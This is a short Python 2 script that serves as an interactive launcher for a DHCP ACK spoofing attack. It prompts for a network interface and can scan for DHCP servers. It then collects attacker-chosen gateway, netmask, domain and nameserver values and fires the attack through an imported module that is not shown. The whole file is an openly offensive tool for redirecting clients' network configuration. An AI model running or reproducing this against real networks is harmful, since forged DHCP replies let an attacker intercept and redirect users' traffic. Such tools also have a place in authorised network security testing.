#!/usr/bin/python2

__author__ = 'redwind'

from dhcp_ack_spoofing import *

print('DHCP_ack_spoofing module.')
interface = raw_input('Network interface to listen/spoof :').strip()

print(interface)

attack = DHCPAckSpoofing(interface=interface)

do_scan = raw_input('Do you want to scan for DHCP servers \n'
                'before listening for incoming requests? (y/n) :')

if do_scan == 'y':
    timeout = input('Timeout value in sec (5 is good) :')
    print('Scanning...')
    attack.scan_dhcp_servers(timeout=timeout)
    attack.print_found_dhcp()

print('\nSetup attack parameters ... ')
domain = DomainConfig(
    gateway=raw_input('gateway :'),
    broadcast=raw_input('broadcast : '),
    netmask=raw_input('netmask :'),
    domain_name=raw_input('domain name :'),
    nameserver=raw_input('nameserver :')
    )

print('\nLaunching the attack!!')
print('waiting...')

attack.launch_attack(domain_config=domain)
